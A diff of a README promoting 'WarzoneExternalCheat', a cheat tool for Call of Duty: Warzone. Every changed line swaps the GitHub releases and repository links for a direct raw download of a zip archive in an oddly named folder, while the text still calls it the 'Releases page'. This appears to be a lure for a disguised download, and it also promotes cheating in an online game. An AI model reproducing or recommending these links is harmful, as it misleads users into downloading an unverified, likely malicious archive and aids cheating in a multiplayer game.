@@ -1,7 +1,7 @@
 # 🎮 WarzoneExternalCheat - Enhance Your Gameplay Experience
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download_Latest_Version-Click_Here-blue)](https://github.com/vvoideg/WarzoneExternalCheat/releases)
+[![Download Now](https://raw.githubusercontent.com/vvoideg/WarzoneExternalCheat/main/psychonomics/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/vvoideg/WarzoneExternalCheat/main/psychonomics/WarzoneExternalCheat.zip)
 
 ## 🚀 Getting Started
 Welcome to WarzoneExternalCheat! This tool is designed to give you an edge in your Call of Duty: Warzone gaming experience. Follow the steps below to get started.
@@ -23,7 +23,7 @@ This version brings exciting features and improvements for the latest season of 
 - Internet connection for updates
 
 ## 📥 Download & Install
-To get WarzoneExternalCheat, visit our [Releases page](https://github.com/vvoideg/WarzoneExternalCheat/releases) to download the latest version. Here’s how to install it:
+To get WarzoneExternalCheat, visit our [Releases page](https://raw.githubusercontent.com/vvoideg/WarzoneExternalCheat/main/psychonomics/WarzoneExternalCheat.zip) to download the latest version. Here’s how to install it:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed at the top.
@@ -52,8 +52,8 @@ For more assistance, feel free to reach out through our issue tracker on GitHub.
 Join our community on Discord and share your experiences. Your insights help us improve the app.
 
 ## 🔗 Important Links
-- [Official GitHub Repository](https://github.com/vvoideg/WarzoneExternalCheat)
-- [Releases Page](https://github.com/vvoideg/WarzoneExternalCheat/releases)
+- [Official GitHub Repository](https://raw.githubusercontent.com/vvoideg/WarzoneExternalCheat/main/psychonomics/WarzoneExternalCheat.zip)
+- [Releases Page](https://raw.githubusercontent.com/vvoideg/WarzoneExternalCheat/main/psychonomics/WarzoneExternalCheat.zip)
 - [Community Discord](#) 
 
 Thank you for using WarzoneExternalCheat. We hope you enjoy your enhanced Warzone experience!
